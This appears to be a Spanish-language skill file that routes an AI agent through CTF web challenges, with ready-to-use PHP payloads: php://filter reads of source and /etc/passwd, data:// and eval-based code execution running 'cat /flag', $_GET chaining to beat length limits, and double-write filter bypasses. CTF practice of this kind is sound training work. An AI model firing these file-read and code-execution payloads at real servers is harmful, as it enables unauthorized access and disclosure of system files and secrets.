---
name: ctf-web
description: Base de conocimiento de ataques Web para CTF — bypass de comparación débil en PHP, bypass de espacios en inyección de comandos, técnicas de eco en eval, cadenas de inyección SSTI, cadenas de explotación de deserialización, checklist de auditoría de código PHP, ubicaciones comunes de flag
routing:
  target_types: [ctf, web]
  task_types: [ctf]
  technologies: [php]
  vulnerability_classes: [rce, ssti, deserialization, type_juggling, path_traversal]
---

# Base de conocimiento de ataques Web para CTF

Base de conocimiento práctica para retos de CTF Web, que proporciona **valores de bypass concretos, plantillas de payload y checklist de auditoría de código**, en lugar de metodología de pentesting.

**Diferencia con `web-security-advanced`**:
- `web-security-advanced` → metodología de pentesting (cómo probar sistemáticamente una aplicación Web)
- `ctf-web` → base de conocimiento práctica para CTF (qué valor usar para la comparación débil de PHP, cómo evadir espacios, cómo se refleja la salida de eval)

## Principios fundamentales

1. **Valores precisos antes que metodología** — proporcionar valores de bypass y payloads directamente utilizables, no sugerencias de "se puede intentar"
2. **Verificación con herramientas** — todos los payloads deben enviarse y verificarse realmente con las herramientas `fetch` o `python_execute`, sin adivinar el resultado
3. **Selección de ruta** — cuando hay varias rutas de explotación, priorizar la que tenga menos filtros y sea más simple
4. **Registro de fallos** — registrar inmediatamente cuando un payload falla, sin repetir el intento

## Flujo de trabajo First-Pass (proceso estándar para retos CTF Web)

1. Acceder a la URL objetivo, revisar el código fuente de la página, cabeceras HTTP y cookies
2. **Si el código fuente contiene `highlight_file` → usar python_execute + strip_tags para extraer el código fuente puro** (la salida de fetch puede interpretarse incorrectamente)
3. Revisar robots.txt, .git/, .svn/, archivos de respaldo (index.php.bak, www.zip, etc.)
4. Escaneo de directorios (comunes: /flag, /admin, /login, /upload, /api)
5. Si hay código fuente → entrar en modo de auditoría de código (ver `php-code-audit-checklist.md`)
6. Si no hay código fuente → sondear activamente puntos de inyección, puntos de carga de archivos, inclusión de archivos

## Enrutamiento de escenarios

| Escenario | Documento de referencia | Contenido principal |
|------|---------|---------|
| ⭐ Lectura de archivos con pseudo-protocolos PHP (probar primero cuando hay inclusión de archivos/parámetros que reciben nombres de archivo) | Ver «Referencia rápida de pseudo-protocolos PHP» abajo | `php://filter` para leer directamente el código fuente/flag |
| Extracción de código fuente | `source-code-extraction.md` | Extracción con strip_tags, php://filter, .phps, archivos de respaldo, verificación de integridad |
| Bypass de comparación débil/de tipos en PHP | `php-bypass-cheatsheet.md` | Lista completa de valores MD5 que empiezan con 0e, bypass de arrays, sobrescritura con extract() |
| ⭐ Colisión de comparación débil MD5 (`md5(a)==md5(b)` comparación débil) | `php-bypass-cheatsheet.md` | ¡Atención! Después de 0e debe ser puramente numérico. Usar directamente valores ya verificados como `QNKCDZO` y `240610708` |
| ⭐ Bypass de doble escritura en preg_replace/str_replace | Ver «Referencia rápida de bypass de doble escritura» abajo | `NSSNSSCTFCTF` → tras la sustitución = `NSSCTF` |
| Bypass de espacios en inyección de comandos | `command-injection-bypass.md` | Tabla completa de ${IFS}/$IFS$9/</%09/%0a |
| Técnicas de eval/RCE | `eval-and-rce-techniques.md` | Diferencias entre system/exec/passthru, orden de salida de highlight_file, exfiltración sin eco |
| Cadenas de inyección SSTI | `ssti-injection-chains.md` | Referencia rápida de cadenas de inyección para Jinja2/Twig/ERB/Mako, etc. |
| Cadenas de explotación de deserialización | `deserialization-playbook.md` | Deserialización en PHP/Java/Python, CRLF de SoapClient |
| Carga de archivos → RCE | `web-security-advanced` → `web-playbook-08-file-vulnerabilities.md` | Bypass de .htaccess, envenenamiento de logs, webshell multilenguaje |
| Referencia rápida para CTF | `web-ctf-quick-reference.md` | Ubicación de flag, formas comunes de cadenas de explotación, pistas en cabeceras de respuesta |
| Auditoría de código PHP | `php-code-audit-checklist.md` | Punto de entrada de datos → filtrado → funciones peligrosas → análisis de salida |

## ⭐ Referencia rápida de pseudo-protocolos PHP (probar primero cuando hay inclusión de archivos/parámetros que reciben nombres de archivo)

**Condición de activación**: cuando el reto presenta cualquiera de las siguientes características, **probar primero php://filter antes de pensar en otros métodos**:

| Característica de activación | Ejemplo |
|---------|------|
| El parámetro acepta nombre de archivo/ruta | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
| `include` / `require` / `include_once` | Estas funciones están en el código fuente |
| La página muestra código fuente | `highlight_file()` / `show_source()` |
| El reto pide "leer un archivo" o "encontrar la flag" | Se requiere explícitamente leer archivos del servidor |

### Referencia rápida de payloads de pseudo-protocolos

```
# 1. Leer código fuente PHP (codificado en base64, evita que PHP lo ejecute)
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

# 2. Leer código fuente PHP (codificado en rot13)
?file=php://filter/read=string.rot13/resource=flag.php

# 3. Leer archivo directamente (como .txt/.log, archivos no PHP)
?file=php://filter/resource=/etc/passwd

# 4. Ejecución de código
?file=php://input  (colocar código PHP en el cuerpo del POST)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### Atención - puntos clave

1. **No pensar solo en "evadir", primero pensar si se puede "leer directamente"** — muchos retos tienen parámetros que aceptan nombres de archivo, se puede usar directamente el pseudo-protocolo para leer flag.php, sin necesidad de evadir ningún filtro
2. **`convert.base64-encode` es un lector universal** — un archivo PHP incluido con include se ejecutará, pero al codificarlo en base64 no se ejecuta, permitiendo obtener el código fuente
3. **El nombre del parámetro no siempre se llama `file`** — puede ser `page`, `num`, `path`, `template`, etc., mientras el valor del parámetro se trate como ruta/nombre de archivo puede funcionar
4. **Tras obtener el base64, decodificar con la herramienta `crypto_decode`** — no imaginar el resultado de la decodificación

## Referencia rápida de ubicaciones comunes de flag

**Atención: tras lograr RCE, se debe probar la ubicación de la flag siguiendo estas prioridades, no quedarse en el flag.php del directorio actual:**

```
Prioridad 1 (más común): cat /flag
Prioridad 2:              cat /flag.txt
Prioridad 3:              ls /  → encontrar el nombre del archivo flag en el directorio raíz
Prioridad 4:              cat /var/www/html/flag.php
Prioridad 5:              cat /home/ctf/flag
Prioridad 6:              cat /root/flag
Otras ubicaciones:        /environment, /proc/self/environ, comando env
```

**Nota**: `ls` por defecto lista el directorio actual (`/var/www/html/`), el `/flag` del directorio raíz solo se ve con `ls /`.

## Identificación rápida de tipos comunes de retos CTF Web

| Característica del reto | Posible tema | Referencia recomendada |
|---------|---------|---------|
| El parámetro acepta nombre de archivo/ruta | ⭐ **Probar primero php://filter para leer la flag** | Ver «Referencia rápida de pseudo-protocolos PHP» arriba |
| La página solo tiene un formulario de login | Inyección SQL / contraseña débil / condición de carrera | php-bypass-cheatsheet.md |
| La página muestra código | Auditoría de código | php-code-audit-checklist.md |
| Aparecen palabras como eval/system | RCE + bypass de espacios/palabras clave | eval-and-rce-techniques.md + command-injection-bypass.md |
| eval + límite de longitud | RCE + bypass de límite de longitud mediante parámetros encadenados de `$_GET` | Ver «Bypass de límite de longitud en RCE» abajo |
| Funcionalidad de carga de archivos | Bypass de extensión / bypass de MIME | `web-security-advanced` → `web-playbook-08-file-vulnerabilities.md` |
| Renderizado de plantillas en la página | SSTI | ssti-injection-chains.md |
| Serialización/deserialización | Deserialización en PHP/Java | deserialization-playbook.md |
| Hay indicios de WAF/filtros | Bypass de regex / bypass de codificación | php-bypass-cheatsheet.md + command-injection-bypass.md |

## Bypass de límite de longitud en RCE (estrategia recomendada)

Cuando `eval()` tiene un límite de longitud con `strlen()` (por ejemplo, ≤ 18 caracteres), **se recomienda usar parámetros encadenados de `$_GET`**:

### Solución estándar

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

**Principio**:
- `eval($_GET['A'])` tiene 16 caracteres, pasa el límite de longitud
- El comando real está en el segundo parámetro GET `A`, sin límite de longitud
- PHP ejecutará primero `eval()`, tomando el valor de `$_GET['A']` como código PHP a ejecutar

### Variantes

| Límite de longitud | payload | número de caracteres |
|---------|---------|--------|
| ≤ 18 | `eval($_GET['A']);` | 16 |
| ≤ 18 | `eval($_GET[0]);` | 14 |
| ≤ 16 | `eval($_GET[A]);` | 13 (sin comillas, PHP convierte automáticamente a cadena) |
| ≤ 12 | `$_GET[0]();` | 10 (el parámetro A pasa el nombre de la función como `system`, otro parámetro pasa el comando) |

### Notas
- No perder tiempo acortando el payload (como usar `?>` para salir del modo PHP, usar comillas invertidas, etc.), **los parámetros encadenados son la solución universal**
- Formato de URL con doble parámetro GET: `?get=eval($_GET['A']);&A=system('cat /flag');`
- Usar la herramienta `python_execute` para construir la petición, en lugar de la herramienta fetch (fetch puede no soportar múltiples parámetros)

## ⭐ Referencia rápida de bypass de doble escritura en preg_replace / str_replace

**Condición de activación**: el código fuente contiene `preg_replace('/X/', '', $str)` o `str_replace('X', '', $str)`, y tras la sustitución se requiere `$str === "X"`

### Principio fundamental
Insertar la palabra clave completa en medio de la palabra clave; tras eliminar la capa interna en la sustitución, la capa externa se une para formar la palabra original.

### Fórmula de construcción general
```
entrada = primera mitad de la palabra clave + palabra clave + segunda mitad de la palabra clave
```

### Tabla de referencia rápida de palabras filtradas comunes

| Palabra clave filtrada | Entrada de doble escritura | Proceso de sustitución | Resultado |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | eliminar NSSCTF del medio → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | eliminar flag del medio → fl+ag | `flag` ✅ |
| cat | `cacatt` | eliminar cat del medio → ca+t | `cat` ✅ |
| system | `syssystemtem` | eliminar system del medio → sys+tem | `system` ✅ |
| hack | `hahackck` | eliminar hack del medio → ha+ck | `hack` ✅ |
| cmd | `cmcmdd` | eliminar cmd del medio → cm+d | `cmd` ✅ |
| exec | `exexecec` | eliminar exec del medio → ex+ec | `exec` ✅ |

### Atención - puntos clave
1. **El bypass de mayúsculas/minúsculas no aplica aquí** — tras la sustitución devuelve `NssCTF`, que no es igual a `"NSSCTF"`, la comparación estricta falla
2. **Señal de identificación** — al ver `preg_replace('/X/', '', $str)` + `$str === "X"` → aplicar doble escritura de inmediato
3. **str_replace funciona igual** — `str_replace` también hace una sola sustitución, la doble escritura también es válida ahí
4. **Sustituciones múltiples** — si el código llama a `preg_replace` varias veces, puede requerirse triple/cuádruple escritura, pero en CTF normalmente basta con doble escritura
